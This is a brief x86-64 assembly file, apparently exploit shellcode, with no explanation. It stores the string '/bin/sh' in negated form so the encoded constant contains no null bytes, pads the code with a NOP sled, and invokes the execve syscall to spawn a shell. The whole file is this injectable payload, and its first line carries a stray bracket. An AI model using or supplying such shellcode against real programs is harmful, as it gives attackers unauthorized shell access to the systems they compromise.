SECTION .text]
global _start
_start:
	mov rdi, 0xff978cd091969dd1
	jmp 0x10
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	xor esi, esi
	mul esi
	add al, 0x3b	
	neg rdi
	push rdi
	push rsp
	pop rdi
	syscall
